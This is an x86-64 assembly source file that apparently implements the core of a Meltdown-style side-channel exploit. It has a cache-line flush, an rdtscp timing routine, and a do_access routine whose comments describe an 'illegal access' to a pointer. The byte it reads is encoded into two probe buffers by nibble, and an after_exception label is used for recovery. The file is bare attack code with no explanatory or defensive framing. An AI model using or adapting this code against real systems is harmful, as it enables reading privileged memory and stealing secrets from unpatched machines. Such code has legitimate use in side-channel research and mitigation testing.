.global clflush
clflush:
    clflush (%rdi)
    ret


.global measure_access_time
measure_access_time:
    push %rdi
    push %rbx

    // rbx = cur_tsc
    rdtscp
    mov %rax, %rbx

    // Deref memory at rdi (rdi is ptr param)
    mov (%rdi), %rdi

    // rax = cur_tsc - rbx
    rdtscp
    sub %rbx, %rax

    pop %rbx
    pop %rdi
    ret


.global do_access
do_access:
    push %rbx
    push %rdi
    push %rsi
    push %rdx

    // Do the illegal access (rdx is ptr param)
    movb (%rdx), %bl
    // Duplicate result to rax
    mov %rbx, %rax

    // calculate our_buffer_lsb offset according to low nibble
    and $0xf, %rax
    shl $0xc, %rax

    // calculate our_buffer_msb offset according to high nibble
    shr $0x4, %rbx
    and $0xf, %rbx
    shl $0xc, %rbx

    // rsi is our_buffer_lsb param
    mov (%rsi, %rax, 1), %rax
    // rdi is our_buffer_msb param
    mov (%rdi, %rbx, 1), %rbx

.global after_exception
after_exception:

    pop %rdx
    pop %rsi
    pop %rdi
    pop %rbx
    ret

